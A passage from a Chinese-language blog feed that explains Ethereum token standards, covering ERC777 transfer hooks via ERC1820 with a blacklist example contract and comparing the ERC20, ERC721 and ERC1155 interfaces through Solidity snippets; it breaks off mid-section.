plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">interface ERC777TokensRecipient &#123;</span><br><span class="line">    function tokensReceived(</span><br><span class="line">        address operator,</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        bytes calldata data,</span><br><span class="line">        bytes calldata operatorData</span><br><span class="line">    ) external;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果接收者希望在转账时收到代币转移通知，就需要在ERC1820合约上注册及实现 <code>ERC777TokensRecipient</code> 接口。</p><h2 id="普通账户地址监听代币转出"><a href="#普通账户地址监听代币转出" class="headerlink" title="普通账户地址监听代币转出"></a>普通账户地址监听代币转出</h2><p>在这里贴出一个Tiny熊写的监听示例，我觉得非常适合小白去理解监听机制。</p><p>监听代币的转出可以让持有者对发出去的代币有更多的控制，例如持有者可以设置一些黑名单，禁止操作员对黑名单内账号转账，</p><p>根据 ERC1820 标准，只有账号的管理者才可以为账号注册接口实现合约，<br>如果一个合约要为某个地址（或自身）实现某个接口， 则需要实现下面这个接口:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">interface ERC1820ImplementerInterface &#123;</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @notice 指示合约是否为地址 “addr” 实现接口 “interfaceHash”。</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @param interfaceHash 接口名称的 keccak256 哈希值</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @param addr 为哪一个地址实现接口</span><br><span class="line">    &#x2F;&#x2F;&#x2F; @return 只有当合约为地址&#39;addr&#39;实现&#39;interfaceHash&#39;时返回 ERC1820_ACCEPT_MAGIC</span><br><span class="line">    function canImplementInterfaceForAddress(bytes32 interfaceHash, address addr) external view returns(bytes32);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过在 <code>canImplementInterfaceForAddress</code> 返回 <code>ERC1820_ACCEPT_MAGIC</code> 以声明实现了 interfaceHash 对应的接口。在调用ERC1820的 setInterfaceImplementer 函数设置接口实现时，会通过 <code>canImplementInterfaceForAddress</code> 检查合约时候实现了接口。</p><p>因此实现监听转出会和功德箱合约有些不一样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin&#x2F;contracts&#x2F;token&#x2F;ERC777&#x2F;IERC777Sender.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin&#x2F;contracts&#x2F;token&#x2F;ERC777&#x2F;IERC777.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin&#x2F;contracts&#x2F;introspection&#x2F;IERC1820Registry.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin&#x2F;contracts&#x2F;introspection&#x2F;IERC1820Implementer.sol&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract SenderControl is IERC777Sender, IERC1820Implementer &#123;</span><br><span class="line"></span><br><span class="line">  IERC1820Registry private _erc1820 &#x3D; IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);</span><br><span class="line">  bytes32 constant private ERC1820_ACCEPT_MAGIC &#x3D; keccak256(abi.encodePacked(&quot;ERC1820_ACCEPT_MAGIC&quot;));</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F;    keccak256(&quot;ERC777TokensSender&quot;)</span><br><span class="line">  bytes32 constant private TOKENS_SENDER_INTERFACE_HASH &#x3D;</span><br><span class="line">        0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895;</span><br><span class="line"></span><br><span class="line">  mapping(address &#x3D;&gt; bool) blacklist;</span><br><span class="line">  address _owner;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    _owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F;  account call erc1820.setInterfaceImplementer</span><br><span class="line">  function canImplementInterfaceForAddress(bytes32 interfaceHash, address account) external view returns (bytes32) &#123;</span><br><span class="line">    if (interfaceHash &#x3D;&#x3D; TOKENS_SENDER_INTERFACE_HASH) &#123;</span><br><span class="line">      return ERC1820_ACCEPT_MAGIC;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      return bytes32(0x00);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function setBlack(address account, bool b) external &#123;</span><br><span class="line">    require(msg.sender &#x3D;&#x3D; _owner, &quot;no premission&quot;);</span><br><span class="line">    blacklist[account] &#x3D; b;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function tokensToSend(</span><br><span class="line">      address operator,</span><br><span class="line">      address from,</span><br><span class="line">      address to,</span><br><span class="line">      uint amount,</span><br><span class="line">      bytes calldata userData,</span><br><span class="line">      bytes calldata operatorData</span><br><span class="line">  ) external &#123;</span><br><span class="line">    if (blacklist[to]) &#123;</span><br><span class="line">      revert(&quot;ohh... on blacklist&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>合约实现 canImplementInterfaceForAddress 函数，以声明对 ERC777TokensSender 接口的实现，返回 ERC1820_ACCEPT_MAGIC。</p><p>函数setBlack用来设置黑名单，它使用一个blacklist映射来管理黑名单， 在 tokensToSend函数的实现里，先检查接收者是否在黑名单内，如果在则revert 回退交易阻止转账。</p><p>给发送者账号(假设为A）设置代理合约的方法为：先部署代理合约，获得代理合约地址， 然后用A账号去调用 ERC1820 的 setInterfaceImplementer函数，参数分别是 A的地址、接口的 keccak256 即0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895 以及 代理合约地址。</p>]]></content>
      
      
      <categories>
          
          <category> EIP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EIP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ERC20-721-1155-998</title>
      <link href="/ERC20-721-1155-998/"/>
      <url>/ERC20-721-1155-998/</url>
      
        <content type="html"><![CDATA[<h1 id="ERC20-721-1155，998协议分析"><a href="#ERC20-721-1155，998协议分析" class="headerlink" title="ERC20,721,1155，998协议分析"></a>ERC20,721,1155，998协议分析</h1><hr><pre><code>author：Thomas_Xu</code></pre><p>最近在总结归纳代币协议，所以把EIP20,721,1155,998首先拿出来对比分析一下。</p><p>首先归纳总结一下这三者的区别：</p><div class="table-container"><table><thead><tr><th style="text-align:left">标准</th><th style="text-align:left">ERC-20</th><th style="text-align:left">ERC-721</th><th style="text-align:left">ERC-1155</th></tr></thead><tbody><tr><td style="text-align:left">代币类型</td><td style="text-align:left">同质化代币</td><td style="text-align:left">非同质化代币</td><td style="text-align:left">同质化代币、非同质化代币、介于同质化和非同质化代币之间可以互相切换的代币</td></tr><tr><td style="text-align:left">特点</td><td style="text-align:left">统一性、可互换、可拆分</td><td style="text-align:left">独特性、不可互换、不可拆分</td><td style="text-align:left">前两者的特点都有，且在一定程度上可以在两者中切换</td></tr><tr><td style="text-align:left">生成处理</td><td style="text-align:left">一次性只能生成一种 ERC-20 代币，一次性只能进行单笔单对象交易，并且交易处理需要多次批准</td><td style="text-align:left">一次性只能生成一种 ERC-721 代币，一次性只能进行单笔单对象交易，并且交易处理需要多次批准</td><td style="text-align:left">一次性可以生成多种 ERC-1155 代币资产类别，一次性可以进行多笔多对象交易，交易处理只需要一次批准</td></tr></tbody></table></div><p>接下来我们分开分析三者的实现逻辑（这里我们不分析其实现方式）</p><h2 id="ERC20"><a href="#ERC20" class="headerlink" title="ERC20"></a>ERC20</h2><p><code>ERC20</code>是一种<code>同质化token</code>, <code>token</code>之间是完全等价的. <code>token</code>就是一个<code>uint256</code>类型的数字.</p><p><code>ERC20</code>也是在目前普及最多的代币协议。</p><p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol" target="_blank" rel="noopener">ERC20源码</a></p><h3 id="EIP20代币标准"><a href="#EIP20代币标准" class="headerlink" title="EIP20代币标准"></a>EIP20代币标准</h3><p><code>EIP20</code>提案是由Fabian Vogelsteller和Vitalik Buterin在2015年11月创建的代币标准，定义了代币合约的标准接口，提供了转移代币的基本功能，并允许代币获得批准，以方便其他链上的第三方使用。此外，该标准接口允许以太坊上定义的任何代币被其他应用程序（钱包、去中心化交易所等）重用。</p><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>ERC20 的功能包括但不限于以下几点：</p><ul><li>转账：将代币从一个帐户转到另一个帐户</li><li>查询余额：获取帐户的当前代币余额</li><li>查询总量：获取网络上可用代币的总供应量</li><li>代币授权：批准一个帐户中一定的代币金额由第三方帐户使用</li></ul><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p><img src="ERC20_interface.jpg" alt=""></p><p>当要实现一个满足 ERC-20 接口标准的 Token 智能合约时，该合约必须满足以上内容实现。</p><h4 id="name"><a href="#name" class="headerlink" title="name"></a>name</h4><p>返回当前 Token 的名称，比如：DSToken，可选项。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function name() constant returns (string name)</span><br></pre></td></tr></table></figure><p>在智能合约中定义，可通过构造方法传值进行初始化，也可直接在代码中指定：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string public name;</span><br></pre></td></tr></table></figure><h4 id="symbol"><a href="#symbol" class="headerlink" title="symbol"></a>symbol</h4><p>symbol 就是通常使用的简称，比如：EOS，可选项。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function symbol() constant returns (string symbol)</span><br></pre></td></tr></table></figure><p>与 name 一样，可通过构造方法传值进行初始化，也可直接在代码中指定：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string public symbol;</span><br></pre></td></tr></table></figure><h4 id="decimals"><a href="#decimals" class="headerlink" title="decimals"></a>decimals</h4><p>当前代币支持的最小精度，也就是小数点后多少位，比如此值为 2，表示 1 个 Token 可分割为 100 份。对应以太坊来说，ETH 的此值为 18，也就是说一个 ETH 可以分割为小数点后 18 位的精度。一般情况下，当查询一个 Token 余额时，是按照最小精度的整型来显示的。比如 decimals 为 2，发行一个代币，那么查询到的结果为 100，此值为可选项。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function decimals() constant returns (uint8 decimals)</span><br></pre></td></tr></table></figure><p>与 name 和 symbol 一样，可通过构造方法传值进行初始化，也可直接在代码中指定：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uint8 public decimals;</span><br></pre></td></tr></table></figure><h4 id="totalSupply"><a href="#totalSupply" class="headerlink" title="totalSupply"></a>totalSupply</h4><p>Token 的发型总量，此处需注意这个数量的单位与 decimals 中指定的最小单位一致，注意它们之间的换算</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function totalSupply() constant returns (uint256 totalSupply)</span><br></pre></td></tr></table></figure><h4 id="balanceOf"><a href="#balanceOf" class="headerlink" title="balanceOf"></a>balanceOf</h4><p>返回地址为_owner的账户的代币余额。返回余额以最小单位计算。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function balanceOf(address _owner) constant returns (uint256 balance)</span><br></pre></td></tr></table></figure><p>此账户余额对应智能合约代码中余额的存储，所有的地址与余额之间的关联都是通过此 mapping 进行存储：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mapping (address &#x3D;&gt; uint256) public balanceOf;</span><br></pre></td></tr></table></figure><h4 id="transfer"><a href="#transfer" class="headerlink" title="transfer"></a>transfer</h4><p>代币转账操作，从执行转账的地址转出指定数量的代币到目标地址，并且必须触发 Transfer 事件。如果执行转账地址没有足够的余额则抛出异常，支持转账金额为 0。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function transfer(address to, uint256 value) public returns (bool);</span><br></pre></td></tr></table></figure><h4 id="transferFrom"><a href="#transferFrom" class="headerlink" title="transferFrom"></a>transferFrom</h4><p>从<code>_from</code>地址发送数量为<code>_value</code>的 token 到<code>_to</code>地址，必须触发 Transfer 事件，主要应用场景为智能合约中对操作账户进行授权，然后达到某个条件时，操作账户可以对被操作账户进行转账操作。如果无权操作则需抛出异常，与 tranfer 相同，可以进行 0 值操作。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function transferFrom(address _from, address _to, uint256 _value) returns (bool success)</span><br></pre></td></tr></table></figure><h4 id="approve"><a href="#approve" class="headerlink" title="approve"></a>approve</h4><p>设置<code>_spender</code>地址可以从操作此方法的地址那里获得的最高金额，此方法可以多次调用。注意：为了阻止向量攻击，客户端需要确认以这样的方式创建用户接口，即将它们设置为 0，然后将其设置为同一个花费者的另一个值。虽然合同本身不应该强制执行，允许向后兼容以前部署的合同兼容性。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function approve(address _spender, uint256 _value) returns (bool success)</span><br></pre></td></tr></table></figure><h4 id="allowance"><a href="#allowance" class="headerlink" title="allowance"></a>allowance</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function allowance(address _owner, address _spender) constant returns (uint256 remaining)</span><br></pre></td></tr></table></figure><h2 id="ERC721"><a href="#ERC721" class="headerlink" title="ERC721"></a>ERC721</h2><p>和<code>ERC20</code>一样，<code>ERC721</code>同样是一个代币标准，<code>ERC721</code>官方简要解释是Non-Fungible Tokens，简写为NFTs，多翻译为非同质代币。</p><p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol" target="_blank" rel="noopener">ERC721源码</a></p><h3 id="功能-1"><a href="#功能-1" class="headerlink" title="功能"></a>功能</h3><p>和<code>ERC20</code>差不太多,<code>ERC721</code> 的功能包括但不限于以下几点：</p><ul><li>转账：将代币从一个帐户转到另一个帐户</li><li>查询余额：获取帐户的当前代币余额</li><li>查询总量：获取网络上可用代币的总供应量</li><li>代币授权：批准一个帐户中一定的代币金额由第三方帐户使用</li></ul><h3 id="函数-1"><a href="#函数-1" class="headerlink" title="函数"></a>函数</h3><p>ERC721最为一个合约标准，提供了在实现ERC721代币时必须要遵守的协议，要求每个ERC721标准合约需要实现ERC721及ERC165接口，接口定义如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.20;</span><br><span class="line"></span><br><span class="line">interface ERC721  &#123;</span><br><span class="line"></span><br><span class="line">    event Transfer(address indexed _from, address indexed _to, uint256 _tokenId);</span><br><span class="line">    event Approval(address indexed _owner, address indexed _approved, uint256 _tokenId);</span><br><span class="line">    event ApprovalForAll(address indexed _owner, address indexed _operator, bool _approved);</span><br><span class="line"></span><br><span class="line">    function balanceOf(address _owner) external view returns (uint256);</span><br><span class="line">    function ownerOf(uint256 _tokenId) external view returns (address);</span><br><span class="line">    </span><br><span class="line">    function safeTransferFrom(address _from, address _to, uint256 _tokenId, bytes data) external payable;</span><br><span class="line">    function safeTransferFrom(address _from, address _to, uint256 _tokenId) external payable;</span><br><span class="line">    function transferFrom(address _from, address _to, uint256 _tokenId) external payable;</span><br><span class="line">    </span><br><span class="line">    function approve(address _approved, uint256 _tokenId) external payable;</span><br><span class="line">    function setApprovalForAll(address _operator, bool _approved) external;</span><br><span class="line">    function getApproved(uint256 _tokenId) external view returns (address);</span><br><span class="line">    function isApprovedForAll(address _owner, address _operator) external view returns (bool);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="name-1"><a href="#name-1" class="headerlink" title="name"></a>name</h4><p>该函数应当返回通证的名称。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function name() constant returns(string name)&#123;</span><br><span class="line">    return &quot;My Non-FungibleToken&quot;;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Symbol"><a href="#Symbol" class="headerlink" title="Symbol"></a>Symbol</h4><p>该函数应当返回通证的符号，它有助于提高与ERC20的兼容性。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function symbol() external view returns (string _symbol);</span><br></pre></td></tr></table></figure><h4 id="totalSupply-1"><a href="#totalSupply-1" class="headerlink" title="totalSupply"></a>totalSupply</h4><p>该函数应当返回区块链上供应的通证总数量，该数量不一定是固定不变的。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">contract MyNFT &#123;</span><br><span class="line">  uint256 private totalSupply &#x3D; 1000000000;</span><br><span class="line"> </span><br><span class="line">  function totalSupply() constant returns (uint256supply)&#123;</span><br><span class="line">    return totalSupply;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="balanceOf-1"><a href="#balanceOf-1" class="headerlink" title="balanceOf"></a>balanceOf</h4><p> 返回由_owner 持有的NFTs的数量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function balanceOf(address _owner) external view returns (uint256);</span><br></pre></td></tr></table></figure><h4 id="ownerOf"><a href="#ownerOf" class="headerlink" title="ownerOf"></a>ownerOf</h4><p>返回tokenId代币持有者的地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function ownerOf(uint256 _tokenId) external view returns (address);</span><br></pre></td></tr></table></figure><h4 id="approve-1"><a href="#approve-1" class="headerlink" title="approve"></a>approve</h4><p>该函数用来授权给另一主体代表持有人进行通证转移操作。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function approve(address _to, uint256 _tokenId);</span><br></pre></td></tr></table></figure><h4 id="safeTransferFrom"><a href="#safeTransferFrom" class="headerlink" title="safeTransferFrom"></a>safeTransferFrom</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function safeTransferFrom(address _from, address _to, uint256 _tokenId, bytes data) external payable;</span><br></pre></td></tr></table></figure><p>安全地转移NFT所有权并发送数据，即将<code>tokenId</code>为参数<code>_tokenId</code>的NFT的所有权由地址_from转移给地址_to，并将额外的数据data发送给地址_to，并触发Transfer事件。参数data没有格式要求。若地址_to是合约地址，data一般包含函数签名值以及函数参数值，当data发送给_to时，会调用合约_to中签名值对应的函数或者回调函数。</p><p>函数能够执行，必需满足以下条件：</p><ul><li>参数<em>from是</em><code>tokenId</code>对应的NFT的所有者</li><li>调用者sender有权转移_<code>tokenId</code>对应NFT的所有权，即：<code>msg.sender</code>是<code>tokenId</code>对应NFT的所有者或者得到了其授权。</li><li>参数_to不是零地址</li></ul><p>另外，该函数使用了<code>payable</code>修饰符，因此可以接收以太坊原生代币（以太币）。</p><h4 id="safeTransferFrom-1"><a href="#safeTransferFrom-1" class="headerlink" title="safeTransferFrom"></a>safeTransferFrom</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function safeTransferFrom(address _from, address _to, uint256 _tokenId) external payable;</span><br></pre></td></tr></table></figure><p>安全地转移NFT所有权，即将<code>tokenId</code>为参数<code>_tokenId</code>的NFT的所有权由地址_from转移给地址_to，并触发Transfer事件。</p><p>调用该函数等价于调用上面的safeTransferFrom中data参数是””的情况，即：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">safeTransferFrom(_from, _to,  _tokenId, &quot;&quot;)</span><br></pre></td></tr></table></figure><h4 id="transferFrom-1"><a href="#transferFrom-1" class="headerlink" title="transferFrom"></a>transferFrom</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function transferFrom(address _from, address _to, uint256 _tokenId) external payable;</span><br></pre></td></tr></table></figure><p>转移NFT所有权，即将<code>tokenId</code>为参数<code>_tokenId</code>的NFT的所有权由地址_from转移给地址_to，并触发Transfer事件。</p><h4 id="approve-2"><a href="#approve-2" class="headerlink" title="approve"></a>approve</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function approve(address _approved, uint256 _tokenId) external payable;</span><br></pre></td></tr></table></figure><p>将<code>tokenId</code>为参数<code>_tokenId</code>的NFT授权给地址_approved，或者更新授权地址为_approved，并且触发Approve事件。</p><p>函数能够执行，必需满足以下条件：</p><ul><li>调用者sender有权转移_tokenId对应NFT的所有权，即：msg.sender是_tokenId对应NFT的所有者或者得到了其授权。</li></ul><h2 id="ERC1155"><a href="#ERC1155" class="headerlink" title="ERC1155"></a><strong>ERC1155</strong></h2><p>根据<code>ERC1155</code>的<a href="[ERC-1155 多代币标准 | ethereum.org](https://ethereum.org/zh/developers/docs/standards/tokens/erc-1155/">官方文档</a>)的介绍，<code>ERC1155</code>是用于多种代币管理的合约标准接口。 单个部署的合约可以包括同质化代币、非同质化代币或其他配置（如半同质化代币）的任何组合。</p><h3 id="多代币标准"><a href="#多代币标准" class="headerlink" title="多代币标准"></a><strong>多代币标准</strong></h3><p>多代币标准的的目的很单纯，就是创建一个智能合约接口，可以代表和控制任何数量的同质化和非同质化代币类型。 这样一来，<code>ERC-1155</code> 代币就具有与 <a href="https://ethereum.org/zh/developers/docs/standards/tokens/erc-20/" target="_blank" rel="noopener">ERC-20</a> 和 <a href="https://ethereum.org/zh/developers/docs/standards/tokens/erc-721/" target="_blank" rel="noopener">ERC-721</a> 代币相同的功能，甚至可以同时使用这两者的功能。 而最重要的是，它能改善这两种标准的功能，使其更有效率，并纠正 <code>ERC-20</code> 和 <code>ERC-721</code>标准上明显的实施错误。</p><p><a href="https://eips.ethereum.org/EIPS/eip-1155" target="_blank" rel="noopener">EIP-1155</a> 中对 ERC-1155 代币进行了全面的描述。</p><h3 id="EIP1155代币标准"><a href="#EIP1155代币标准" class="headerlink" title="EIP1155代币标准"></a>EIP1155代币标准</h3><p><code>BIP1155</code>提案概述了一个标准的智能合约接口，可以代表任意数量的同质化代币和非同质化代币类型。ERC20等现有标准要求为每种代币类型部署单独的合约。ERC721标准的代币ID是一个单一的非同质化索引，每组非同质化代币都会被部署为具有统一设置的独立的合约。相比之下，ERC1155多代币标准允许每个代币ID表示一个新的可配置代币类型，它可以有自己的元数据、供应量以及其他属性。</p><p>每个函数的参数集合中都会包含_id参数，表示交易中的一种特定的代币或代币类型。</p><h3 id="ERC-1155-的功能和特点"><a href="#ERC-1155-的功能和特点" class="headerlink" title="ERC-1155 的功能和特点"></a>ERC-1155 的功能和特点</h3><h4 id="批量传输"><a href="#批量传输" class="headerlink" title="批量传输"></a>批量传输</h4><p>通过一次合约调用传输多种资产。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; ERC-20</span><br><span class="line">function transferFrom(address from, address to, uint256 value) external returns (bool);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; ERC-1155</span><br><span class="line">function safeBatchTransferFrom(</span><br><span class="line">    address _from,</span><br><span class="line">    address _to,</span><br><span class="line">    uint256[] calldata _ids,</span><br><span class="line">    uint256[] calldata _values,</span><br><span class="line">    bytes calldata _data</span><br><span class="line">) external;</span><br></pre></td></tr></table></figure><p>批量传输和ERC20的传输非常相似。唯一的区别就是我们将数值作为数组传递。同时传递了数组id。</p><p>举个例子：我们给出<code>ids=[3, 6, 13]</code> 和 <code>values=[100, 200, 5]</code>，传输结果将是：</p><ol><li>将 id 3 的 100 个代币从 <code>_from</code> 传输到 <code>_to</code>。</li><li>将 id 6 的 200 个代币从 <code>_from</code> 传输到 <code>_to</code>。</li><li>将 id 13 的 5 个代币从 <code>_from</code> 转移到 <code>_to</code>。</li></ol><p>值得注意的是在ERC-1155中，我们只有<code>transferFrom</code>而没有<code>transfer</code>。</p><h4 id="批量余额"><a href="#批量余额" class="headerlink" title="批量余额"></a>批量余额</h4><p>我们也用ERC20版本的余额查询作为对比：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; ERC-20</span><br><span class="line">function balanceOf(address owner) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; ERC-1155</span><br><span class="line">function balanceOfBatch(</span><br><span class="line">    address[] calldata _owners,</span><br><span class="line">    uint256[] calldata _ids</span><br><span class="line">) external view returns (uint256[] memory);</span><br></pre></td></tr></table></figure><p>其实可以发现，在ERC1155版本中查询余额会更加方便，我们可以在单次调用中获取多个余额。参数中传递所有者账户数组和代币id数组。</p><p>举个例子，对于给出的 <code>_ids=[3, 6, 13]</code> 和 <code>_owners=[0xbeef..., 0x1337..., 0x1111...]</code>，返回值将为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    balanceOf(0xbeef...),</span><br><span class="line">    balanceOf(0x1337...),</span><br><span class="line">    balanceOf(0x1111...)</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h4 id="批量审批"><a href="#批量审批" class="headerlink" title="批量审批"></a>批量审批</h4><p>ERC1155的授权过程与ERC20有所不同，这里不是批准特定的金额，而是通过<code>setApprovalForall</code>函数设置操作账户为已批准或未批准（传参：批准为true，不批准为false）</p><p>查看当前的审批状态可以通过 <code>isApprovedForall</code> 完成。 如您所见，要么全部批准，要么不批准。 不能定义要批准代币的数量，甚至代币类型。</p><p>这是考虑到简洁性而故意设计的。 您只能批准一个地址的所有代币。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; ERC-1155</span><br><span class="line">function setApprovalForAll(</span><br><span class="line">    address _operator,</span><br><span class="line">    bool _approved</span><br><span class="line">) external;</span><br><span class="line"></span><br><span class="line">function isApprovedForAll(</span><br><span class="line">    address _owner,</span><br><span class="line">    address _operator</span><br><span class="line">) external view returns (bool);</span><br></pre></td></tr></table></figure><h4 id="回调函数"><a href="#回调函数" class="headerlink" 